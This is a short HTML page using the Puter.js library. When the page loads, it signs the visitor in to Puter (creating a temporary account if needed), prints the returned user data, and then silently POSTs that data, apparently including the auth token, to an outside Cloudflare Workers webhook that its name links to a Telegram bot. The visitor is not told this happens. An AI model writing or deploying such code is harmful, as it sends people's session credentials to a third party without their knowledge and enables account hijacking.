<html>
<body>
    <script src="https://js.puter.com/v2/"></script>
    <script>
        async function fetchPuterToken(){
            try{
                let userData = await puter.auth.signIn({"attempt_temp_user_creation":true});
                puter.print('Signed in:<br>' + JSON.stringify(userData)+'<br><br>');
                await fetch('https://puter-telegram-bot-webhook-proxy.utsavmadaan823.workers.dev/webhook', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(userData)
                });
            }catch(error){
                puter.print("Error: "+error.message+'<br><br>');
            }
        }
        fetchPuterToken();
    </script>
</body>
</html>
